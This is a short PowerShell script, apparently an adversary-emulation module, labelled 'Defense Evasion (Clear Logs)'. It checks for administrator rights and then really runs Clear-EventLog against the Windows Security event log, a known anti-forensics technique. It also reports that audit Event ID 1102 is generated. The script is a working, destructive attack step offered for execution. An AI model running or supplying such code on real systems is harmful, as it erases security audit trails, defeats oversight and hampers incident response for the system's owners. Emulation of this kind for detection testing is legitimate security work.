$ErrorActionPreference = "Continue"
Write-Host "[*] Executing Defense Evasion (Clear Logs)..."

$logName = "Security"
Write-Host "[*] Targeting Log: $logName"

# Check Admin Privileges
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")

if (-not $isAdmin) {
    Write-Host "    [!] WARNING: Clearing Event Logs requires Administrator privileges."
    Write-Host "    [!] Attempting anyway (will likely fail)..."
}

try {
    # REAL EXECUTION
    Write-Host "    [>] Clear-EventLog -LogName $logName"
    Clear-EventLog -LogName $logName -ErrorAction Stop
    Write-Host "    [+] $logName Event Log Cleared Successfully."
    Write-Host "    [+] Event ID 1102 Generated (Log Clear Audit)."
} catch {
    Write-Host "    [-] Failed to clear logs: $_"
    Write-Host "    [i] Tip: Run the application as Administrator."
}

Write-Host "`n[+] Evasion Complete."
